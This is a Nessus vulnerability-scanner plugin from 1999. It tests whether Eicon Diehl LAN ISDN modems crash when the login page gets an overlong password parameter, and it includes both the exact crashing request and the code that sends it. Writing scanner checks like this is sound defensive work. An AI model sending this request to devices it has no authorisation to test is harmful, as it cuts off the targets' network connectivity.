#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10062);
 script_bugtraq_id(665);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-1999-1533");
 name["english"] = "Eicon Diehl LAN ISDN modem DoS";
 name["francais"] = "Déni de service contre les modems Eicon Diehl";
 
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to crash the remote modem by
telnetting to it on port 80 and by making
the following request :
    
    GET /login.htm?password=AA[...]AAA

To reactivate your modem, just reset it.

An attacker can use this to prevent your
network from connecting onto the internet.


Solution : change your ISDN modem.

Risk factor : High";

 desc["francais"] = "
Il s'est avéré possible de faire planter le modem
distant en s'y connectant au port 80 et en faisant
la requete :

	 GET /login.htm?password=AA[...]AAA
	 
Pour le réactiver, faites un reset de votre modem.

Un pirate peut utiliser ce problème pour empecher
votre réseau de se raccorder à internet.

Solution : changez de modem.

Facteur de risque : Elevé";
 
 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "overflows a remote buffer";
 summary["francais"] = "overflow d'un buffer du modem";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nes", "no404.nasl");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);
 soc = http_open_socket(port);
 if(soc)
 {
  req = string("/login.htm?password=", crap(200));
  req = http_get(item:req, port:port);
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  
  if(http_is_dead(port:port))security_hole(port);
 }
}
